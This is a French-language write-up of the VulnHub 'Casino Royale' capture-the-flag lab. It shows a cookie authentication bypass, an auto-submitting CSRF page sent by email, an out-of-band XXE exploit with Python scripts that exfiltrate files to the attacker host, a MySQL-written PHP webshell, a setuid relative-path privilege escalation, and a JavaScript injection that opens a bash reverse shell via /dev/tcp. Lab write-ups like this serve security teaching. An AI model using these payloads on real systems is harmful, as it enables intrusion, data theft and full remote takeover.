---
title: "Solution du CTF Casino Royale de VulnHub"
tags: [CTF, VulnHub]
---

[Casino Royale](https://vulnhub.com/entry/casino-royale-1,287/) est un CTF créé par [Creosote](https://twitter.com/_creosote) qui est l'auteur de plusieurs CTFs avec un background sur la saga 007.

Le CTF est plutôt original et au fur et à mesure de l'exploitation, on découvre un nouvel élément à énumérer.

Malheureusement j'ai perdu une bonne partie de mon temps à cause d'un script créé par l'auteur qui ne prend pas en compte toutes les possibilités alors que des outils réels l'auraient fait sans problème. Nous verrons cela à la fin.

## Au casino, comme dans Casino

```
Nmap scan report for 192.168.242.129
Host is up (0.00050s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
25/tcp   open  smtp?
| fingerprint-strings: 
|   Hello: 
|     220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
|     Syntax: EHLO hostname
|   Help: 
|     220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
|     5.5.2 Error: command not recognized
|   JavaRMI, LANDesk-RC, NCP, NULL, NotesRPC, TerminalServer, WMSRequest, afp, giop, ms-sql-s, oracle-tns: 
|_    220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
|_smtp-commands: casino.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=casino
| Subject Alternative Name: DNS:casino
| Not valid before: 2018-11-17T20:14:11
|_Not valid after:  2028-11-14T20:14:11
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 2 disallowed entries 
|_/cards /kboard
|_http-server-header: Apache/2.4.25 (Debian)
8081/tcp open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

J'ai jeté un œil au `phpcli` qui est vulnérable à une faille de divulgation de code source (déjà croisé sur d'autres CTFs) mais il n'y avait rien d'intéressant à en tirer.

Je me suis donc tourné vers le serveur Apache avec d'abord une énumération de dossiers :

```
301        9l       28w      321c http://192.168.242.129/includes
301        9l       28w      320c http://192.168.242.129/install
301        9l       28w      323c http://192.168.242.129/javascript
301        9l       28w      323c http://192.168.242.129/phpmyadmin
301        9l       28w      318c http://192.168.242.129/cards
403       11l       32w      303c http://192.168.242.129/server-status
```

Le dossier `install` fait mention d'une installation d'un logiciel nommé `PokerMax Poker League Installation`.

Il existe un exploit de type bypass d'authentification : [PokerMax Poker League 0.13 - Insecure Cookie Handling - PHP webapps Exploit](https://www.exploit-db.com/exploits/6766).

Pour le moment on ne peut pas l'utiliser, mais on garde ça en tête.

En énumérant les fichiers, c'est plus intéressant :

```
200       12l       20w      220c http://192.168.242.129/index.html
200       61l      231w     2796c http://192.168.242.129/index.php
200       38l       59w      847c http://192.168.242.129/index.html.old
```

Le `index.html` est celui qu'on voyait par défaut, mais le `index.php` correspond à la page d'index du `PowerMax`.

L'exploit consiste à définir un cookie dans son navigateur de nom `ValidUserAdmin` et de valeur `admin`. J'ai utilisé l'extension de navigateur `EditThisCookie` pour créer le cookie. Attention à bien choisir le degré de sécurité `Lax` sinon ça ne marche pas.

Une fois connecté en tant qu'administrateur on peut lister les comptes enregistrés. L'utilisatrice `Valenka` a attiré mon attention, car c'est la seule qui a une adresse email définie.

Quand je regarde ses informations de profil je vois le message suivant :

> Project Manager of various client projects on: /vip-client-portfolios/?uri=blog
> 
> We are casino-royale.local -- Update your hosts file!

## Arctic Fox

Quand on suit cette URL on trouve une installation de `SnowFox CMS`, une appli web inconnue au bataillon (d'ailleurs RIP le website).

Une des entrées mentionne une adresse email et la lecture d'emails :

> [New Clients - Please Read](http://casino-royale.local/vip-client-portfolios/?uri=blog/posts/new%20clients%20-%20please%20read)
> 
> If you've been referred and are interested in our "assistance", please send us an email.
> 
> Send an email to our CMS admin: *valenka@casino-royale.local*
> 
> Make sure to **reference a known customer** or at least someone we know in the **subject line**, otherwise the email will be deleted without being looked at.
> 
> Valenka checks her email often as well as manages this site.
> 
> Include any links to relevant information such as references, services, referrals, etc.

Ça tombe bien, car le port SMTP est ouvert.

Cette fois, c'est une faille de Cross Site Request Forgery qu'il faut exploiter, la zone d'administration n'étant apparemment pas protégée par un quelconque token :

[Snowfox CMS 1.0 - Cross-Site Request Forgery (Add Admin) - PHP webapps Exploit](https://www.exploit-db.com/exploits/35301)

J'ai repris le code d'exemple du PoC et l'ai adapté avec un auto-submit :

```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST" name="myform">
      <input type="hidden" name="emailAddress" value="haxor@mail.com" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="haxor@mail.com" />
      <input type="hidden" name="newPassword" value="haxor@mail.com" />
      <input type="hidden" name="confirmPassword" value="haxor@mail.com" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
    <script>document.myform.submit();</script>
  </body>
</html>
```

Il faut ensuite inviter l'utilisatrice à visiter la page où l'on héberge le code HTML :

```console
$ ncat casino-royale.local 25 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.242.129:25.
220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
HELO casino.localdomain
250 casino.localdomain
MAIL FROM: haxor
250 2.1.0 Ok
RCPT TO: valenka
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
subject: fisher recomended you
pls check my website
http://192.168.242.1/
.
250 2.0.0 Ok: queued as 5EB711EC1
QUIT
221 2.0.0 Bye
```

Premier problème quand on teste cela : le serveur échoue si on donne un expéditeur avec un domaine, car il tente l'envoi d'une requête DNS qui est bloquée si la VM est en host-only. Situation qu'on ne pouvait pas vraiment prévoir, mais on verra plus tard qu'il y a pire.

Une fois le CSRF passé je peux me connecter avec l'identifiant [haxor@mail.com](mailto:haxor@mail.com) et fouiller dans l'interface d'administration pour déterminer s'il est possible d'obtenir un RCE ce qui n'était pas le cas.

C'est finalement dans le profil du compte `Le Chiffre` que j'ai trouvé une piste :

> I primarily deal with the numbers, along with our most Elite customers with access to /ultra-access-view/main.php

## Xtra Xtra Exploitable

Il faut regarder le code HTML de la page pour comprendre ce qui est attendu :

```html
<h1 style="color:red;">Client Access: ULTRA</h1>
<hr>
<br>
<!--FYI this is taking POST requests without a front end for the time being..
Try using curl to POST Xml commands or Xml script files herE!   

PHP code below...
 
    libxml_disable_entity_loader (false); 
    
    $xmlfile = file_get_contents('php://input'); 
    
    $dom = new DOMDocument(); 
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom); 
    $user = $creds->customer; 
    $pass = $creds->password; 
    echo "Welcome $user !";
-->


Welcome  ! 


</body>


<!--also pls update the password for the custom ftp acct once the front end is finished..since it's easy -->
```

Il s'agit d'une faille XXE avec un cas d'usage qui est traité par `Wapiti`. Normalement l'exfiltration Out Of Band réalisée par `Wapiti` se fait via le domaine `wapiti3.ovh` mais ici, la VM étant en host-only, elle n'a pas accès à Internet.

J'ai rajouté un `Dockerfile` au projet permettant de mettre en place l'endpoint avec ses dépendances (Apache + PHP avec url_rewriting). Le tout se fait via une commande `make` à lancer dans le dossier de `Wapiti` :

```console
$ make wapiti-endpoint 
docker build -f Dockerfile.endpoint -t wapiti-endpoint .
Sending build context to Docker daemon  323.5MB
Step 1/7 : FROM php:7.1-apache
 ---> b9858ffdd4d2
Step 2/7 : COPY ./endpoint/ /var/www/html/
 ---> Using cache
 ---> 8392b8a501b0
Step 3/7 : COPY ./endpoint/.htaccess /var/www/html/.htaccess
 ---> Using cache
 ---> a39985ae0e44
Step 4/7 : RUN sed -i '/LoadModule rewrite_module/s/^#//g' /etc/apache2/apache2.conf &&     sed -i 's#AllowOverride [Nn]one#AllowOverride All#' /etc/apache2/apache2.conf
 ---> Using cache
 ---> 190c42b4ea9a
Step 5/7 : RUN ln -s /etc/apache2/mods-available/rewrite.load /etc/apache2/mods-enabled/rewrite.load
 ---> Using cache
 ---> 888b042dc13a
Step 6/7 : RUN chmod 777 /var/www/html/ssrf_data
 ---> Using cache
 ---> 69a3fdf4ebe8
Step 7/7 : RUN chmod 777 /var/www/html/xxe_data
 ---> Running in c74317836a9c
Removing intermediate container c74317836a9c
 ---> b3d624b63c22
Successfully built b3d624b63c22
Successfully tagged wapiti-endpoint:latest
docker run --rm -dit --name wapiti-running-endpoint -p 80:80 wapiti-endpoint
3f90a2fbbe760af7868a3cccd5ff5dfad61c789c765d14b8da496724621655a4
```

On peut alors lancer `Wapiti` sur l'URL vulnérable en spécifiant en option l'URL du endpoint (`external` est l'URL que la cible va contacter, `internal` est celle qu'on fetche pour les résultats, ici on aurait pu définir 192.168.242.1 pour les deux).

```console
$ wapiti -u http://casino-royale.local/ultra-access-view/main.php --scope page -m xxe --color --external-endpoint http://192.168.242.1/ --internal-endpoint http://127.0.0.1/

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.1.7 (wapiti-scanner.github.io)
[*] You are lucky! Full moon tonight.
[*] Saving scan state, please wait...

[*] Launching module xxe
---
Out-Of-Band XXE vulnerability by sending raw XML in request body
The target sent 60 bytes of data to the endpoint at 2023-05-03T12:44:13 with IP 192.168.242.129.
Received data can be seen at http://127.0.0.1/xxe_data/g875ge/1/72617720626f6479/1683125053-0-192.168.242.129.txt.
Evil request:
    POST /ultra-access-view/main.php HTTP/1.1
    Content-Type: text/xml

    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY % remote SYSTEM "http://192.168.242.1/dtd/g875ge/1/72617720626f6479/linux2.dtd">
    %remote; %intern; %trick; ]>
    <xml><test>hello</test></xml>
---
---
Out-Of-Band XXE vulnerability by sending raw XML in request body
The target sent 2031 bytes of data to the endpoint at 2023-05-03T12:44:13 with IP 192.168.242.129.
Received data can be seen at http://127.0.0.1/xxe_data/g875ge/1/72617720626f6479/1683125053-1-192.168.242.129.txt.
Evil request:
    POST /ultra-access-view/main.php HTTP/1.1
    Content-Type: text/xml

    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY % remote SYSTEM "http://192.168.242.1/dtd/g875ge/1/72617720626f6479/linux.dtd">
    %remote; %intern; %trick; ]>
    <xml><test>hello</test></xml>
---
---
The target reached the DTD file on the endpoint but the exploitation didn't succeed.
Evil request:
    POST /ultra-access-view/main.php HTTP/1.1
    Content-Type: text/xml

    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY % remote SYSTEM "http://192.168.242.1/dtd/g875ge/1/72617720626f6479/windows.dtd">
    %remote; %intern; %trick; ]>
    <xml><test>hello</test></xml>
---
---
The target reached the DTD file on the endpoint but the exploitation didn't succeed.
Evil request:
    POST /ultra-access-view/main.php HTTP/1.1
    Content-Type: text/xml

    <?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://192.168.242.1/dtd/g875ge/1/72617720626f6479/javalin.dtd"><foo>&trick;</foo>
---
---
The target reached the DTD file on the endpoint but the exploitation didn't succeed.
Evil request:
    POST /ultra-access-view/main.php HTTP/1.1
    Content-Type: text/xml

    <?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://192.168.242.1/dtd/g875ge/1/72617720626f6479/javawin.dtd"><foo>&trick;</foo>
---
```

Le endpoint stocke les résultats de l'exfiltration. On peut obtenir les fichiers texte en suivant les URLs. On retrouve notamment le fichier `/etc/passwd` que voici :

```
root:x:0:0:root:/root:/bin/bash
--- snip ---
le:x:1000:1000:Le Chiffre,,,:/home/le:/bin/bash
mysql:x:113:120:MySQL Server,,,:/nonexistent:/bin/false
valenka:x:1001:1001:,,,:/home/valenka:/bin/bash
postfix:x:114:121::/var/spool/postfix:/bin/false
ftp:x:115:124:ftp daemon,,,:/srv/ftp:/bin/false
ftpUserULTRA:x:1002:1002::/var/www/html/ultra-access-view:/bin/bash
```

J'ai écrit un serveur web en Python qui sera chargé de décoder le contenu exfiltré envoyé par le serveur en base64 :

```python
from base64 import b64decode                                                                                           
from http.server import SimpleHTTPRequestHandler                                                                       
import socketserver                                                                                                    
                                                                                                                       
class S(SimpleHTTPRequestHandler):                                                                                     
    def _set_headers(self):                                                                                            
        self.send_response(200)                                                                                        
        self.send_header('Content-type', 'text/html')                                                                  
        self.end_headers()                                                                                             
                                                                                                                       
    def do_GET(self):                                                                                                  
        if self.path.startswith("/xoxo/"):                                                                             
            data = self.path[6:]                                                                                       
            print("="*50)                                                                                              
            print(b64decode(data).decode(errors="replace"))                                                            
            print("="*50)                                                                                              
            self.send_response(200)                                                                                    
            self.end_headers()                                                                                         
            self.wfile.write(b"")                                                                                      
        else:                                                                                                          
            super().do_GET()                                                                                           
                                                                                                                       
                                                                                                                       
PORT = 80                                                                                                              
                                                                                                                       
Handler = S                                                                                                            
with socketserver.TCPServer(("", PORT), Handler) as httpd:                                                             
    print("serving at port", PORT)                                                                                     
    httpd.serve_forever()
```

Si le path ne correspond pas, il agit comme un serveur normal en livrant le fichier demandé.

De l'autre côté j'ai un code pour l'exploitation qui me permet d'exfiltrer le fichier de mon choix :

```python
import sys

import requests
from requests.exceptions import RequestException

if len(sys.argv) < 2:
    print("Usage: python {} filename".format(sys.argv[0]))
    exit()

my_ip = "192.168.242.1"
filename = sys.argv[1]

xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % remote SYSTEM "http://{}/valid.dtd">
%remote; %intern; %trick; ]>
<xml><test>hello</test></xml>""".format(my_ip)

dtd = """<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource={}">
<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://{}/xoxo/%payload;'>">""".format(filename, my_ip)

with open("valid.dtd", "w") as fd:
    fd.write(dtd)

try:
    response = requests.post(
        "http://casino-royale.local/ultra-access-view/main.php",
        data=xml,
        headers={"Content-Type": "text/xml"},
    )
except RequestException as exception:
    print("Error occurred:", exception)
else:
    text = response.text.strip()
    print(text)
```

De cette façon, je demande un fichier dans un terminal et regarde l'output dans un autre.

En regardant le Github du projet `PokerMax` je détermine om se trouve normalement le fichier de configuration :

[pleague/pokerleague_.php at master · arem/pleague · GitHub](https://github.com/arem/pleague/blob/master/pokerleague_.php)

Ici on devine qu'il s'agit de `includes/config.php`. J'exfiltre donc ce fichier :

```php
<?PHP
/*
 PokerMax Pro Poker League Software
 Written by Steve Dawson - 01-07-2007 www.stevedawson.com
*/

/** Complete your database info below and then run the yourdomain.com/install/  **/
/**************** DATABASE MODIFICATION SECTION ****************/
$server = "localhost";                              // Server Host
$DBusername = "valenka";                               // Database Username
$DBpassword = "11archives11!";                                   // Database Password
$database = "pokerleague";                       // Database Name

$tournament_table = "pokermax_tournaments"; 
$admin_table = "pokermax_admin";
$player_table = "pokermax_players";
$score_table = "pokermax_scores";
 
/**************** OPTIONS SECTION ****************/
$search_limit = "50"; // listings per page - tournaments and players
$DatabaseError = "<p align=\"center\" class=\"red\">No details found, please try again later</p>";
# $playerid = date("dmyHis");
$tournamentid = date("dmyHis");
/**************** DATE STAMP SECTION ****************/
$dateadded = date("j F Y");     // Date and time of info request
$version = "v0.13";

?>

```

## Licensed to pwn

On ne peut pas se connecter en SSH car le port n'est pas accessible, mais l'accès avec le compte `valenka` est accepté sur le FTP.

Le dossier correspond à `/var/www/html/ultra-access-view` soit celui de l'utilisateur `ftpUserULTRA`. C'est aussi le dossier qui contient le script PHP vulnérable au XXE.

Malheureusement aucun des dossiers présents ne permet l'écriture donc la dépose d'un webshell est impossible.

Vu que les identifiants pour `valenka` sont avant tout des identifiants MySQL je peux utiliser le `phpMyAdmin` qu'on a découvert via énumération au début.

Le compte semble être l'équivalent du root sans la restriction d'être local uniquement.

Je me suis orienté vers la possibilité de déposer un fichier sous la racine web à l'aide de `INTO OUTFILE`. Il a fallu quelques essais avant de trouver un dossier world-writable :

```sql
SELECT '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/includes/shell.php'
```

Avec ce webshell je rapatrie et exécute un reverse-ssh. Je peux ensuite utiliser les identifiants de `valenka` via `su`.

Je remarque un binaire setuid root dans `/opt` :

```console
valenka@casino:~$ ls /opt/casino-royale/
total 48K
drwxrwxr-x 2 root le       4.0K Feb 22  2019 .
drwxr-xr-x 4 root root     4.0K Jan 17  2019 ..
-rwxrw---- 1 le   www-data  210 Feb 20  2019 casino-data-collection.py
-rw------- 1 le   le         40 Feb 22  2019 closer2root.txt
-rw-r--r-- 1 root root       79 Feb 20  2019 collect.php
-rwxr-xr-x 1 root root      174 Feb 21  2019 index.html
-rwsr-sr-x 1 root root     8.5K Feb 20  2019 mi6_detect_test
-rwxrwxr-x 1 le   le         54 Feb 20  2019 php-web-start.sh
-rwxr-x--- 1 le   le        402 Feb 20  2019 run.sh
-rwxrwxr-x 1 le   le         71 Feb 20  2019 user-data.log
```

Le binaire appelle bash avec le bon chemin absolu, mais le script qui est appelé est quant à lui relatif :

```console
valenka@casino:/opt/casino-royale$ strings mi6_detect_test 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
=W       
AWAVA
AUATL
[]A\A]A^A_
/bin/bash run.sh
```

L'exploitation est triviale :

```console
valenka@casino:/opt/casino-royale$ cd /tmp/
valenka@casino:/tmp$ echo bash > run.sh
valenka@casino:/tmp$ chmod 755 run.sh 
valenka@casino:/tmp$ /opt/casino-royale/mi6_detect_test 
root@casino:/tmp# id
uid=0(root) gid=1001(valenka) groups=1001(valenka)
root@casino:/tmp# cd /root
root@casino:/root# ls
ctf-scripts  Desktop  Downloads  flag  Maildir  node_modules  package-lock.json  Pictures
root@casino:/root# cd flag/
root@casino:/root/flag# ls
files  flag.sh  index.php
root@casino:/root/flag# ./flag.sh 
--------------------------------------------
--------------------------------------------
Go here:   http://casino-royale.local:8082
--------------------------------------------
--------------------------------------------
PHP 5.6.38-2+0~20181015120829.6+stretch~1.gbp567807 Development Server started at Thu May  4 10:18:03 2023
Listening on http://0.0.0.0:8082
Document root is /root/flag
Press Ctrl-C to quit.
```

En se connectant à ce port, on obtient alors ce flag.

## Ghosted

On comprend mieux pourquoi déclencher le CSRF via l'envoi du mail était aussi compliqué :

```bash
#!/bin/bash

qck=$(ls /home/valenka/Maildir/new/)
if [ -z "$qck" ]; then
        echo "empty"
        exit
fi

for mess in /home/valenka/Maildir/new/*; do
        m=$(cat $mess)
        sub=$(echo "${m}" |grep subject)
        v=$(echo "${sub}" |grep -ie dryden -ie fisher -ie obanno -ie mollaka -ie alex -ie dimitrios)
        if [ -z "$v" ]; then
                echo "no good"
                rm $mess
                exit
        else
                cd /root/ctf-scripts/
                echo "good"
                badurl=$(cat $mess |grep http)
                fna=$(echo "$mess" |rev | cut -d '/' -f1 |rev)
                #echo "$fna"
                cop=$(cp /root/ctf-scripts/ok.js /root/ctf-scripts/$fna.js)

                #echo "var newurl=http://192.168.178.143/casino/bad.html'" >> $fna.js
                echo "var newurl='""${badurl}""'" >> $fna.js 
                echo 'casper.thenOpen(newurl, function() {' >> $fna.js
                echo '  console.log("new pageloaded");'>> $fna.js
                echo '});' >> $fna.js

                echo 'casper.then(function() {' >> $fna.js
                # echo '  casper.click('input[type="submit"]');' >> $fna.js
                x=$(echo "  casper.click('input[")
                y=$(echo 'type="submit"]')
                z=$(echo "');")

                echo $x$y$z >> $fna.js
                echo '});' >> $fna.js
                echo 'casper.run();' >> $fna.js
                /root/node_modules/casperjs/bin/casperjs $fna.js
                sleep 3
                mysql -h "localhost" -u "valenka" "-p11archives11!" "vip" < "/root/ctf-scripts/enab.sql"
                rm /root/ctf-scripts/$fna.js
                rm $mess
        fi


done
sleep 120
```

Ce script lancé depuis la crontab de `root` va lire les emails à destination de `valenka`.

On peut voir déjà qu'il recherche le nom d'un contact connu comme stipulé dans le scénario, mais pas tous et pas toujours le prénom.

Ensuite on peut voir que la recherche du sujet se fait uniquement sur la chaine `subject` en minuscule alors qu'un client mail prendra la valeur quelle que soit la casse.

Pour terminer, l'extraction de l'URL considère que cette dernière devrait être seule sur une ligne sans suffixe ni préfixe.

## Rien que pour vos yeux

Les plus attentifs auront remarqué qu'en raison du manque de vérification sur l'URL il est possible d'injecter du code javascript dans le fichier qui est ensuite passé à `CasperJS`.

On peut alors réaliser une exécution de commande qui nous amène directement à `root` :

```console
$ ncat 192.168.242.129 25 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.242.129:25.
220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
HELO casino.localdomain
250 casino.localdomain
MAIL FROM: haxor
250 2.1.0 Ok
RCPT TO: valenka
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
subject: fisher recomended you
http'; "use strict"; var spawn = require("child_process").spawn; var child = spawn("bash", ["-c", "bash -i >& /dev/tcp/192.168.242.1/21 0>&1"]); //
.
250 2.0.0 Ok: queued as 4F63BBAD1
QUIT
221 2.0.0 Bye
```

Mission accomplie :

```console
$ sudo ncat -l -p 21 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::21
Ncat: Listening on 0.0.0.0:21
Ncat: Connection from 192.168.242.129.
Ncat: Connection from 192.168.242.129:55866.
bash: cannot set terminal process group (429): Inappropriate ioctl for device
bash: no job control in this shell
root@casino:~/ctf-scripts# id
id
uid=0(root) gid=0(root) groups=0(root)
```

